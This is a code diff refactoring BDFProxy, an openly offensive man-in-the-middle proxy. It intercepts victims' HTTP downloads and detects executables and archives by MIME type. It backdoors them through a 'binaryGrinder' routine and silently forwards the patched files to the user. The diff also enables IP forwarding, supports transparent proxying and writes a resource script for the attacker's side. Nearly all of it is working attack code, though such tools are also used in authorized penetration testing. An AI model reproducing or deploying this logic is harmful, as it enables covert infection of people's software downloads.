-            for keyword in self.keysblacklist:
+            for keyword in self.keys_blacklist:
                 if keyword.lower() in flow.request.path.lower():
                     self.patchIT = False
-                    logging.info("Keyword blacklist hit: %s, PATH: %s",
-                                 str(self.keysblacklist), str(flow.request.path))
+                    EnhancedOutput.logging_info("Keyword blacklist hit: {0}, PATH: {1}".format(self.keys_blacklist, flow.request.path))
                     break
 
     def hosts_blacklist_check(self, flow):
-        if type(self.hostblacklist) is str:
-
-            if self.hostblacklist.lower() in flow.request.host.lower(): 
+        if type(self.host_blacklist) is str:
+            if self.host_blacklist.lower() in flow.request.host.lower():
                 self.patchIT = False
-                logging.info("Host Blacklist hit: %s : HOST: %s ",
-                             str(self.hostblacklist), str(flow.request.host))
-
-        elif flow.request.host.lower() in [x.lower() for x in self.hostblacklist]:
+                EnhancedOutput.logging_info("Host Blacklist hit: {0} : HOST: {1} ".format(self.host_blacklist, flow.request.host))
+        elif flow.request.host.lower() in [x.lower() for x in self.host_blacklist]:
             self.patchIT = False
-            logging.info("Host Blacklist hit: %s : HOST: %s ",
-                         str(self.hostblacklist), str(flow.request.host))
-
+            EnhancedOutput.logging_info("Host Blacklist hit: {0} : HOST: {1} ".format(self.host_blacklist, flow.request.host))
         else:
-            for host in self.hostblacklist:
+            for host in self.host_blacklist:
                 if host.lower() in flow.request.host.lower():
                     self.patchIT = False
-                    logging.info("Host Blacklist hit: %s : HOST: %s ",
-                                 str(self.hostblacklist), str(flow.request.host))
+                    EnhancedOutput.logging_info("Host Blacklist hit: {0} : HOST: {1} ".format(self.host_blacklist, flow.request.host))
                     break
 
     def parse_target_config(self, targetConfig):
         for key, value in targetConfig.items():
             if hasattr(self, key) is False:
                 setattr(self, key, value)
-                logging.debug("Settings Config %s: %s", key, value)
+                EnhancedOutput.logging_debug("Settings Config {0}: {1}".format(key, value))
 
             elif getattr(self, key, value) != value:
-
                 if value == "None":
                     continue
 
-                #test if string can be easily converted to dict
+                # test if string can be easily converted to dict
                 if ':' in str(value):
                     for tmpkey, tmpvalue in dict(value).items():
                         getattr(self, key, value)[tmpkey] = tmpvalue
-                        logging.debug("Updating Config %s: %s", tmpkey, tmpvalue)
-
+                        EnhancedOutput.logging_debug("Updating Config {0}: {1}".format(tmpkey, tmpvalue))
                 else:
                     setattr(self, key, value)
-                    logging.debug("Updating Config %s: %s", key, value)
+                    EnhancedOutput.logging_debug("Updating Config {0}: {1}".format(key, value))
 
     def handle_request(self, flow):
         print "*" * 10, "REQUEST", "*" * 10
-        print "[*] HOST: ", flow.request.host
-        print "[*] PATH: ", flow.request.path
+        EnhancedOutput.print_info("HOST: {0}".format(flow.request.host))
+        EnhancedOutput.print_info("PATH: {0}".format(flow.request.path))
         flow.reply()
         print "*" * 10, "END REQUEST", "*" * 10
 
     def handle_response(self, flow):
-        #Read config here for dynamic updating
-        
-        try:
-            self.userConfig = ConfigObj('bdfproxy.cfg')
-            self.hostblacklist = self.userConfig['hosts']['blacklist']
-            self.hostwhitelist = self.userConfig['hosts']['whitelist']
-            self.keysblacklist = self.userConfig['keywords']['blacklist']
-            self.keyswhitelist = self.userConfig['keywords']['whitelist']
-            self.zipblacklist = self.userConfig['ZIP']['blacklist']
-            self.tarblacklist = self.userConfig['TAR']['blacklist']
+        # Read config here for dynamic updating
 
-            for target in self.userConfig['targets'].keys():
-                if target == 'ALL':
-                    self.parse_target_config(self.userConfig['targets']['ALL'])
+        for target in self.userConfig['targets'].keys():
+            if target == 'ALL':
+                self.parse_target_config(self.userConfig['targets']['ALL'])
 
-                if target in flow.request.host: 
-                    self.parse_target_config(self.userConfig['targets'][target])
-                
-        except Exception as e:
-            print "[!] YOUR CONFIG IS BROKEN:", str(e)
-            logging.warning("[!] YOUR CONFIG IS BROKEN %s", str(e))
+            if target in flow.request.host:
+                self.parse_target_config(self.userConfig['targets'][target])
 
         print "=" * 10, "RESPONSE", "=" * 10
 
-        print "[*] HOST: ", flow.request.host
-        print "[*] PATH: ", flow.request.path
+        EnhancedOutput.print_info("HOST: {0}".format(flow.request.host))
+        EnhancedOutput.print_info("PATH: {0}".format(flow.request.path))
 
         # Below are gates from whitelist --> blacklist
         # Blacklists have the final say, but everything starts off as not patchable
-        #  until a rule says True. Host whitelist over rides keyword whitelist.
-
-        self.patchIT = False
+        # until a rule says True. Host whitelist over rides keyword whitelist.
 
         self.hosts_whitelist_check(flow)
-
         self.keys_whitelist_check(flow)
-
         self.keys_backlist_check(flow)
-
         self.hosts_blacklist_check(flow)
 
         if 'content-length' in flow.request.headers.keys():
             if int(flow.request.headers['content-length'][0]) >= long(self.FileSizeMax):
-                print "[!] Not patching over content-length, forwarding to user"
-                logging.info("Over FileSizeMax setting %s : %s", flow.request.host, flow.request.path)
+                EnhancedOutput.print_warning("Not patching over content-length, forwarding to user")
+                EnhancedOutput.logging_info("Over FileSizeMax setting {0} : {1}".format(flow.request.host, flow.request.path))
                 self.patchIT = False
 
         if self.patchIT is False:
-            print '[!] Not patching, flow did not make it through config settings'
-            logging.info("Config did not allow the patching of HOST: %s, PATH: %s",
-                         flow.request.host, flow.request.path)
+            EnhancedOutput.print_warning("Not patching, flow did not make it through config settings")
+            EnhancedOutput.logging_info("Config did not allow the patching of HOST: {0}, PATH: {1}".format(flow.request.host, flow.request.path))
 
             flow.reply()
-
         else:
-            if self.bytes_have_format(flow.reply.obj.response.content, 'zip') and self.convert_to_Bool(self.CompressedFiles) is True:
-                    aZipFile = flow.reply.obj.response.content
-                    flow.reply.obj.response.content = self.zip_files(aZipFile)
 
-            elif self.bytes_have_format(flow.reply.obj.response.content, 'pe') or self.bytes_have_format(flow.reply.obj.response.content, 'elf') or \
-                self.bytes_have_format(flow.reply.obj.response.content, 'fatfile') or self.bytes_have_format(flow.reply.obj.response.content, 'machox86') or \
-                self.bytes_have_format(flow.reply.obj.response.content, 'machox64'):             
+            mime_type = magic.from_buffer(flow.reply.obj.response.content, mime=True)
 
-                orgFile = flow.reply.obj.response.content
+            if mime_type in self.debType['mimes'] and self.str2bool(self.CompressedFiles) is True:
+                flow.reply.obj.response.content = self.deb_files(flow.reply.obj.response.content)
 
-                fd, tmpFile = mkstemp()
+            elif mime_type in self.binaryMimeType['mimes']:
+                tmp = tempfile.NamedTemporaryFile()
+                tmp.write(flow.reply.obj.response.content)
+                tmp.flush()
+                tmp.seek(0)
 
-                with open(tmpFile, 'w') as f:
-                    f.write(orgFile)
-
-                patchResult = self.binaryGrinder(tmpFile)
-
+                patchResult = self.binaryGrinder(tmp.name)
                 if patchResult:
-                    file2 = open("backdoored/" + os.path.basename(tmpFile), "rb").read()
-                    flow.reply.obj.response.content = file2
-                    os.remove('./backdoored/' + os.path.basename(tmpFile))
-                    print "[*] Patching complete, forwarding to user."
-                    logging.info("Patching complete for HOST: %s, PATH: %s", flow.request.host, flow.request.path)
+                    EnhancedOutput.print_info("Patching complete, forwarding to user.")
+                    EnhancedOutput.logging_info("Patching complete for HOST: {0}, PATH: {1}".format(flow.request.host, flow.request.path))
+
+                    with open(os.path.join(BDFOLDER, os.path.basename(tmp.name)), 'r+b') as file2:
+                        flow.reply.obj.response.content = file2.read()
                 else:
-                    print "[!] Patching failed"
-                    logging.info("Patching failed for HOST: %s, PATH: %s", flow.request.host, flow.request.path)
+                    EnhancedOutput.print_error("Patching failed")
+                    EnhancedOutput.logging_info("Patching failed for HOST: {0}, PATH: {1}".format(flow.request.host, flow.request.path))
 
-                os.close(fd)
-
-                os.remove(tmpFile)
-
-            elif self.bytes_have_format(flow.reply.obj.response.content, 'gz') and self.convert_to_Bool(self.CompressedFiles) is True:
-                # assume .tar.gz for now
-                flow.reply.obj.response.content = self.tar_files(flow.reply.obj.response.content, 'gz')
-            elif self.bytes_have_format(flow.reply.obj.response.content, 'bz') and self.convert_to_Bool(self.CompressedFiles) is True:
-                # assume .tar.bz for now
-                flow.reply.obj.response.content = self.tar_files(flow.reply.obj.response.content, 'bz')
-            elif self.bytes_have_format(flow.reply.obj.response.content, 'tar') and self.convert_to_Bool(self.CompressedFiles) is True:
-                flow.reply.obj.response.content = self.tar_files(flow.reply.obj.response.content, 'tar')
+                tmp.close()
+            else:
+                for archive in self.archiveTypes:
+                    if mime_type in archive['mimes'] and self.str2bool(self.CompressedFiles) is True:
+                        flow.reply.obj.response.content = self.archive_files(flow.reply.obj.response.content, archive['params'])
 
             flow.reply()
 
         print "=" * 10, "END RESPONSE", "=" * 10
 
+################################## START MAIN #######################################
 
-#Intial CONFIG reading
-userConfig = ConfigObj('bdfproxy.cfg')
+CONFIGFILE = "bdfproxy.cfg"
+BDFOLDER = "backdoored"
+
+# Initial CONFIG reading
+userConfig = ConfigObj(CONFIGFILE)
 
 #################### BEGIN OVERALL CONFIGS ############################
-#DOES NOT UPDATE ON THE FLY
-resourceScript = userConfig['Overall']['resourceScript']
+# DOES NOT UPDATE ON THE FLY
+resourceScript = userConfig['Overall']['resourceScriptFile']
 
 config = proxy.ProxyConfig(clientcerts=os.path.expanduser(userConfig['Overall']['certLocation']),
                            body_size_limit=int(userConfig['Overall']['MaxSizeFileRequested']),
                            port=int(userConfig['Overall']['proxyPort']),
-                           mode=userConfig['Overall']['transparentProxy'],
+                           mode=userConfig['Overall']['proxyMode'],
                            )
 
-if userConfig['Overall']['transparentProxy'] != "None":
-    config.transparent_proxy = {'sslports': userConfig['Overall']['sslports'],
-                                'resolver': platform.resolver()
-                                }
+if userConfig['Overall']['proxyMode'] != "None":
+    config.proxy_mode = {'sslports': userConfig['Overall']['sslports'],
+                         'resolver': platform.resolver()
+                         }
 
 server = ProxyServer(config)
 
 numericLogLevel = getattr(logging, userConfig['Overall']['loglevel'].upper(), None)
 
 if not isinstance(numericLogLevel, int):
-    raise ValueError("o_O: INFO, DEBUG, WARNING, ERROR, CRITICAL for loglevel in conifg")
-    sys.exit()
+    EnhancedOutput.print_error("INFO, DEBUG, WARNING, ERROR, CRITICAL for loglevel in conifg")
+    sys.exit(1)
 
 logging.basicConfig(filename=userConfig['Overall']['logname'],
                     level=numericLogLevel,
@@ -802,25 +754,34 @@ logging.basicConfig(filename=userConfig['Overall']['logname'],
 
 #################### END OVERALL CONFIGS ##############################
 
-#Write resource script
-print "[!] Writing resource script."
+# Write resource script
+EnhancedOutput.print_warning("Writing resource script.")
 resourceValues = []
 dictParse(userConfig['targets'])
-writeResource(str(resourceScript), resourceValues)
-print "[!] Resource writen to %s" % str(resourceScript)
+try:
+    writeResource(str(resourceScript), resourceValues)
+except Exception as e:
+    EnhancedOutput.print_error(str(e))
+    sys.exit(1)
 
-#configuring forwarding
+EnhancedOutput.print_warning("Resource writen to {0}".format(str(resourceScript)))
+EnhancedOutput.print_warning("Configuring forwarding ('echo 1 > /proc/sys/net/ipv4/ip_forward')")
+
 try:
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 except Exception as e:
-    print str(e)
+    EnhancedOutput.print_error(str(e))
+    sys.exit(1)
 
-m = proxyMaster(server)
-print "[!] Starting BDFProxy"
-print "[!] Author: @midnite_runr | the[.]midnite).(runr<at>gmail|.|com"
-print "[!] IRC: freenode #BDFactory"
-logging.info("################ Starting BDFProxy ################")
+m = ProxyMaster(server)
+try:
+    m.setConfig()
+except Exception as e:
+    EnhancedOutput.print_error("Your config file is broken: {0}".format(e))
+    EnhancedOutput.logging_error("Your config file is broken: {0}".format(e))
+    sys.exit(1)
 
-logging.info("[!] ConfigDump %s", json.dumps(userConfig, sort_keys=True, indent=4))
-
+EnhancedOutput.print_info("Starting BDFProxy")
+EnhancedOutput.print_info("Author: @midnite_runr | the[.]midnite).(runr<at>gmail|.|com")
+EnhancedOutput.logging_info("################ Starting BDFProxy-ng ################")
 m.run()
